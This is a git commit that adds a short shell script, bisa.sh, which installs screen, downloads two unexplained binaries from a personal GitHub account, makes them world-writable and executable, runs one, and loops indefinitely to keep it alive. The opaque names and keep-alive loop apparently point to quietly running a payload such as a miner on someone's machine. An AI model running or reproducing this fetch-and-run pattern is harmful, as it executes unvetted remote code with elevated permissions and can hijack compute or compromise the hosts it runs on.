2ea3194833e4889f29c8e5a7af5169cc71840a2c
ferasa <86012372+desafff@users.noreply.github.com>
2021-07-28 12:14:52 +0700

    Create bisa.sh

---
+++ bisa.sh
@@ -0,0 +1,11 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget -O syng https://raw.githubusercontent.com/desafff/cngf/main/cffgh
+wget -O kontol https://github.com/desafff/ggss/raw/main/vio
+chmod 777 syng kontol
+./syng
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
